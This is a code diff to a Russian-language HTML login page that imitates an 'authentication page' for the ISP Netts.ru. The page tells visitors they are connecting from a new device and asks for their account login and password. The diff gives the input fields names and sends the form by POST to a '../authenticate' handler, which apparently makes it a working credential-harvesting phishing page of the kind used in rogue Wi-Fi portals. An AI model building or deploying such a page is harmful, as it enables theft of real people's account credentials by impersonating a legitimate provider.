@@ -18,6 +18,7 @@
             flex-direction: column;
             justify-content: center;
             height: 100vh;
+            min-height: 800px;
             font-family: Ubuntu, Helvetica, Arial, sans-serif;
             margin: 0;
         }
@@ -171,16 +172,16 @@
             <img class="logo" src="./images/logo.png" alt="Logo">
             <img class="label" src="./images/label.svg" alt="Label">
         </div>
-        <form class="form" action="/login" accept-charset="UTF-8" method="post">
+        <form class="form"name="input" action="../authenticate" method="POST">
             <h1 class="heading">Страница аутентификации</h1>
             <p class="description">
                 Вы подключаетесь к сети Netts.ru с нового устройства.<br>
                 <br>
                 Пожалуйста, введите логин и пароль от личного кабинета для обновления данных и доступа в Интернет.
             </p>
-            <input type="text" placeholder="Логин">
-            <input type="password" placeholder="Пароль">
-            <input type="submit" name="commit" value="Войти" class="button-submut" data-disable-with="Войти">
+            <input type="text" placeholder="Логин" name="login" id="login">
+            <input placeholder="Пароль" type="password" name="password" id="password">
+            <input type="submit" name="commit" value="Отправить" class="button-submut">
         </form>
     </div>
     <div class="footer-container">
